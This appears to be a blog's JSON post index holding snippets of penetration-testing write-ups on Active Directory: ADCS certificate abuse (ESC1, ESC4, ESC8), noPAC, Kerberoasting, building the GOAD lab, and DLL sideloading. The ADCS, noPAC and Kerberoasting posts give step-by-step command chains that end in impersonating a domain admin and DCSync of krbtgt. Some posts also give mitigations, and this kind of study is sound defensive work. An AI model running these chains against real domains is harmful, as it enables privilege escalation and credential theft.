[ { "title": "Active Directory Certificate Services: Revisited", "url": "/posts/ADCS/", "categories": "", "tags": "", "date": "2023-02-15 00:00:00 -0800", "snippet": "This blog was meant to be posted on my previous job’s blog, unfortunately I was let go on the day it was going to be posted.ADCS OverviewActive Directory Certificate Services (AD CS) is a role in Microsoft Windows Server that enables organizations to issue and manage digital certificates, which are used to secure communications over networks. ADCS is part of the Active Directory domain services, and it allows administrators to create and manage public key infrastructure (PKI) within their organization. ADCS includes tools for certificate enrollment, revocation, and renewal, as well as for managing certificate templates and certificate trust lists. SpecterOps published detailed research on the security state of ADCS and how the misconfigurations can lead to privilege escalation or environment persistence.The goal of this blog post is to present some common scenarios and problems we faced when utilizing attack paths within Active Directory Certificate Services (ADCS) and how to overcome them.Concepts and Definitions Certification Authority (CA): This is the core component of ADCS, and it is responsible for issuing, revoking, and managing digital certificates. There are different types of CAs, either standalone or enterprise with its own specific role and responsibilities. Certificate Templates: These are predefined configurations that specify the parameters and settings for certificates that are issued by the CA. Administrators can create custom templates or use the default templates provided by ADCS. Certificate: A certificate is a digitally signed document that is used to verify the identity of a user, device, or application. Subject Alternative Name (SAN): One or more additional identities to be associated with a digital certificate. Extended Key Usage (EKU): Object identifiers that specifies the intended purposes of a digital certificate. Certificate Signing Request (CSR): A request that is sent to a certification authority (CA) to apply for a digital certificate. PKINIT: a protocol that is used to establish secure authentication between a client and a server using public key cryptography.The enrollment process involves the user requesting a certificate with a certificate signing request (CSR) based on a certificate template that is suited to the intended use of the certificate. The CSR is then sent to the certification authority (CA), which will verify that the user is allowed to enroll for a certificate and that the certificate template exists. If these conditions are met, the CA will issue a certificate to the user.MisconfigurationsThere several ways to leverage ADCS misconfigurations to maintain persistence or escalate privilege as Penetration Tester/Red Teamer:One way to gain persistence on a network is by sending the CSR to the CA and obtaining the current user’s certificate. With a certificate that is valid for authentication, we can compromise the user even if the password is changed. This is because the certificate is used as an authentication mechanism, so the password is not relevant for that type of authentication (as long as the certificate has not expired). Another way to gain persistence is by extracting a machine account certificate with local administrator right then using it to authenticate as the machine account. As long as the certificate is valid within validity period, we can maintain persistence on the network even after the system changes its password or undergoes a system wipe. The certificate can also be used to obtain user’s NTLM hash via a TGT request when authenticating with PKINIT. PKINIT is a protocol that uses public key cryptography to establish secure authentication between a client and a server. Due to a “failsafe” in PKINIT authentication, it is possible to obtain user/machine NTLM hash due to legacy authentication support.Gaining persistence on the network by having the user or machine account is useful, but being able to escalate their privileges on the network is even better. This can be achieved in several ways, such as by allowing unprivileged users to enroll in a certificate template that enables them to become enrollment agents. An enrollment agent can request a certificate on behalf of another entity, allowing the unprivileged agent to enroll for a certificate with high-privilege user permissions. Another method for enrolling as a different user such as Domain Admin is through the use of SANs (Subject Alternative Names), which allow multiple identities to be associated with a digital certificate (known as ESC1). The Certification Authority (CA) Web Enrollment role service can also be abused. Since the web enrollment service uses HTTP and NTLM authentication, we can coerce an NTLM authentication and relay to the HTTP endpoint to enroll for a certificate (known as ESC8).Attack ScenariosESC 8 - NTLM Relay to AD CS HTTP EndpointsThere are many blogs focused on how to execute a full attack chain from both Linux and Windows machines using Petitpotam to coerce the Domain Controller to authenticate our controlled server and relay the authentication to ADCS HTTP enrollment endpoint. One common problem we encounter is when we get a successful relay to the ADCS HTTP endpoint but receive an ‘Error obtaining certificate!’ instead.![[ESC8_1.png]]This error occurs when the template we enter is incorrect and the default DomainController was not being used. Here we can use Certipy made by Oliver Lyak to find the correct DomainController Template name.certipy find -u tevora@domain.local -p 'Longpassword123!' -dc-ip 10.10.10.10 -enabled -stdoutNoticed the name of the template is DC_Computer. The template command in ntlmrelayx will need to be changed to the corresponded name.python3 ntlmrelayx.py -debug -smb2support --target http://CA-SERVER/certsrv/certfnsh.asp --adcs --template DC_ComputerWith the correct template name, the base64 encoded template generates successfully.Instead of using ntlmrelayx from Impacket, we can use Certipy to achieve the same result.certipy relay -ca CA-SERVER -template DC_ComputerESC 1 - Misconfigured Certificate TemplatesIn this scenario, the ESC1 misconfigured certificate template allows domain users to enroll for certificates and impersonate any Active Directory user. The template has ‘client authentication’ and the ‘Enrollee Supplies Subject’ set to true which mean the requester can specify a subjectAltName (SAN) that allows additional identities to be associated with the certificate, including a privileged user. Manager approval is not required which mean the request for certificates are automatically approved without any additional checks or verification.Example ESC 1 vulnerable template:Request ESC1 vulnerable template with User Principal Name (UPN) ADMIN@DOMAIN.LOCALcertipy req -u 'tevora@domain.local -p 'Longpassword123!' -target CA-SERVER.domain.local -template ESC1 -ca CA-SERVER -upn ADMIN@DOMAIN.LOCALAuthentication with the admin.pfx we requested to get NTLM hash and Kerberos ticketcertipy auth -pfx admin.pfx -dc-ip 10.10.10.10Recently Certipy will have error “KRB_AP_ERR_BAD_INTEGRITY(Integrity check on decrypted field failed)” when trying to retrieve NTLM or Kerberos ticket.We can circumvent this by using PKINITtools as we demonstrated from previous post or we can use the “-ldap-shell” command to authenticate to LDAP and configure Resource-Based Constrained Delegation (RBCD) on a workstation target.certipy auth -pfx dc2.pfx -dc-ip 10.10.10.10 -ldap-shellESC 4 - Vulnerable Certificate Template Access ControlThe ESC4 misconfigured certificate template allows domain users to have write privileges over the template. With permissions FullControl, WriteDacl, WriteOwner, or WriteProperty to the template, it can be abused to overwrite the configuration of the certificate template to make the it vulnerable to ESC1.Example ESC 4 vulnerable template:The authenticated users have the write property principles right on the ESC4 template. We are able to reconfigure the ESC4 template adding the ‘ENROLLEE_SUPPLIES_SUBJECT’ flag and perform ESC1 attack. Make sure to use the -save-old flag to save the template configuration to restore it later.certipy template -u 'tevora@domain.local -p 'Longpassword123!' -template ESC4 -dc-ip 10.10.10.10 -save-oldESC4 template now has ‘ENROLLEE_SUPPLIES_SUBJECT’ flag, client authentication , and pretty much everything set to true.We can perform ESC1 attack as we did earlier and make sure to restore the template back to the original state.certipy template -u 'tevora@domain.local -p 'Longpassword123!' -template ESC4 -dc-ip 10.10.10.10 -configuration ESC4.jsonMitigation and wrap-up ESC1: Remove the “ENROLLEE_SUPPLIES_SUBJECT” flag will prevent certificates from being requested by any domain account. If the flag cannot be removed, the certificate approval management must be activated (CA Certificate Manager Approval) before the certificate is issued, and not allow “AutoEnrollment” by default. ESC4: Review the ACLs on the templates and remove unnecessary access rights. ESC8: Disable NTLM authentication and HTTP endpoint. Otherwise, only allow HTTPS traffic and configure Extended Protection for Authentication (EPA).Misconfigured ADCS is one of the most frequently exploited vulnerability in 2022, with Penetration Tester/Red Teamer utilizing these scenarios to escalate privileges on internal networks after an initial foothold. In order to prevent future exploitation on these vulnerabilities is to properly configure ADCS and ensure that all certificates are properly managed and configured. This may require regular audits and updates to certificate policies, as well as strict access controls to prevent unauthorized users from obtaining or manipulating certificates." }, { "title": "sAMAccountName Spoofing/noPAC", "url": "/posts/noPAC/", "categories": "", "tags": "", "date": "2022-09-03 00:00:00 -0700", "snippet": "IntroductionBy combining CVE-2021-42278 and CVE-2021-42287 it is possible, under default conditions, for a regular user to easily impersonate a domain admin. This means that any domain user can effectively become a domain administrator, which makes these vulnerabilities extremely severe. CVE-2021-42278 - Invalid Computer Account NameComputer account names in Active Directory end with “$”, but is not correctly enforced. The computer account name attribute is “sAMAccountName” and it is possible to see and edit the this attribute manually. CVE-2021-42287 - Kerberos Key Distribution Center ConfusionWhen a request for a service ticket is sent and it is not found, the KDC will automatically lookup the requested ticket appended with “$”. Exploitation StepsTo exploit this issue, an attacker needs the ability to control a computer account. As mentioned, the attacker needs to be able to modify both the “servicePrincipalName” attribute and “sAMAccountName” attribute. The simplest way to achieve this is to create one by the MachineAccountQuota attribute which is the default configuration for any unprivileged user to create up to 10 computer accounts. Enumerate a domain controller. Create a new computer account without any SPN. Leverage CVE-2021-42278 to modify the “sAMAccountName” to the domain controller account name. Get a TGT of the controlled computer account. Restore the computer account name so it will not be found when the KDC looks for it. Leverage CVE-2021-42287 using the obtained TGT to request a service ticket with S4U2Self.There are many tools we can use.https://github.com/ly4k/PachineOr impacket with ShutdownRepo’s custom scripts.GetST.py and renameMachine.py# 0. create a computer accountaddcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword'# 1. clear its SPNsaddspn.py --clear -t 'ControlledComputer$' -u 'domain\\user' -p 'password' 'DomainController.domain.local'# 2. rename the computer (computer -&gt; DC)renameMachine.py -current-name 'ControlledComputer$' -new-name 'DomainController' -dc-ip 'DomainController.domain.local' 'domain.local'/'user':'password'# 3. obtain a TGTgetTGT.py -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController':'ComputerPassword'# 4. reset the computer namerenameMachine.py -current-name 'DomainController' -new-name 'ControlledComputer$' 'domain.local'/'user':'password'# 5. obtain a service ticket with S4U2self by presenting the previous TGTKRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -altservice 'cifs/DomainController.domain.local' -k -no-pass -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController'# 6. DCSync by presenting the service ticketKRB5CCNAME='DomainAdmin.ccache' secretsdump.py -just-dc-user 'krbtgt' -k -no-pass -dc-ip 'DomainController.domain.local' @'DomainController.domain.local'More resourceMigrationUpdate all the domain controllers and apply Microsoft patches KB5008380 and KB5008602 as soon as possible to mitigate the issue." }, { "title": "Kerberos to Kerberoasting", "url": "/posts/Kerberos/", "categories": "", "tags": "", "date": "2022-09-01 00:00:00 -0700", "snippet": "IntroductionFirst we need to learn what Kerberos is all about. It is an authentication protocol used in Windows Active Directory but not authorization. It is able to identify each user when a password is provided, but it does not validate which resources or services can the user access. The Kerberos protocol uses symmetric-key cryptography so that a client can prove its identity to a key distribution center (KDC).KerberoastingBy logging into an Active Directory domain as any authenticated user, anyone can request service tickets (TGS) for service accounts by specifying their SPN value. Active Directory will return an encrypted ticket, which is encrypted using the NTLM hash of the account that is associated with that SPN. Tools like hashcat or hydra can brute forcing these service tickets and obtain plain text passwords when they successfully cracked.Exploitation Steps Scan Active Directory for user accounts with SPN values set Request service tickets from AD using SPN values Extract service tickets to memory and save to a file Brute force attack those passwords offline until crackedBy using the GetUserSPNs.py script from impacket:python3 GetUserSPNs.py -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeopleDetection and MigrationThe best mitigation defenders have at their disposal against Kerberoasting is to enforce robust password policies for service accounts. Organizations should mandate long, complicated passwords (25 or more characters) that are changed frequently. Length and complexity frustrate offline cracking efforts. Frequent password rotation, say at 30-day intervals, narrows the window of time attackers have to crack long hashes for an indeterminate length of time.Defenders can set traps within their Active Directory environment. Known as “honey accounts,” these work in a similar fashion to network honeypots: enticing advanced attackers doing reconnaissance through Active Directory with believable sounding service names. Once compromised, however, these accounts do nothing but trigger an alert if they are used to login or generate a service ticket request." }, { "title": "Game Of Active Directory Lab", "url": "/posts/GOAD/", "categories": "", "tags": "", "date": "2022-08-29 00:00:00 -0700", "snippet": "IntroductionGOAD is a pentest active directory LAB project. The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to practice usual attack techniques.Many attack and vulnerable paths are available: Password reuse between computer (PTH) Spray User = Password Password in description SMB share anonymous SMB not signed Responder Zerologon Windows defender ASREPRoast Kerberoasting AD Acl abuse Unconstraint delegation Ntlm relay Constrained delegation Install MSSQL MSSQL trusted link MSSQL impersonate Upload asp app Multiples forest Anonymous RPC user listing Child parent domain Generate certificate and enable ldaps ADCS - ESC 1/2/3/8 Certify Samaccountname/nopac Petitpotam Printerbug Drop the mic Shadow credentials Mitm6 ETC…InstallationA computer with at least 32GB RAM is recommended, 5 windows VMs will be running simultaneously.For me, I am using macOS.git clone https://github.com/Orange-Cyberdefense/GOAD.gitStart all VMs with vagrant.vagrant upOnce it is done we need to provision them using ansible playbook.brew install virtualenvbrew install python3.8cd ansiblepython3.8 -m venv .venvsource .venv/bin/activatepython3 -m pip install ansible-core==2.12.6python3 -m pip install pywinrmansible-galaxy install -r requirements.ymlansible-playbook main.ymlYou will most likely encounter errors during installation, make to sure to rerun ansible-playbook main.yml after fixing them.Issues and fixesmacOS: If you get the may have been in progress in another thread when fork() was called error, run the following code before ansible-playbook main.ymlexport OBJC_DISABLE_INITIALIZE_FORK_SAFETY=YESAt times error like problems installing certain powershell module and you will need to manually install them by RDP into the VM.For example,vagrant RDP DC01And enter the following commands[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12Register-PSRepository -DefaultInstall-Module -Name ComputerManagementDscInstall-Module -Name xNetworkingInstall-Module -Name xDnsServerInstall-Module -Name ActiveDirectoryDSCStart hacking!Before we start let’s make a snapshot of the lab.vagrant snapshot SNAP1Then we will run crackmapexec to check the lab status.crackmapexec smb 192.168.56.0/24Have fun!" }, { "title": "Learning about DLL Sideloading", "url": "/posts/DLL-Sideloading/", "categories": "", "tags": "", "date": "2022-08-24 00:00:00 -0700", "snippet": "IntroductionDLL Sideloading is similar to DLL search order hijacking which involves in dropping a malicious DDL to execute second-stage payload. Normally in DLL hijacking, the program that executes our payload tend to crash after execution. However, in this case the program and the payload get executed alongside each other since the original legitimate DLL is also dropped.Recently Unit 42 from Palo Alto Networks published a blog documenting how the APT29 use such technique on their campaigns, read more about here. In order to learn more about the technique, I read blogs from here and here to mimic the attack and to gain hands on experience.Steps Find a legitimate un/signed executable and vulnerable to DLL-Sideloading using Procmon Create a proxy DLL from the legitimate DLL using SharpDLLProxy Create Sliver shellcode Upload them to victim host and profit.After thoughtIt was a fun exercise for me to learn about how DLL Sideloading works and how to build a proxy DLL from the legitimate one. In addition, trying out the Sliver C2 Framework and adding it to my arsenal is always a good thing!" } ]
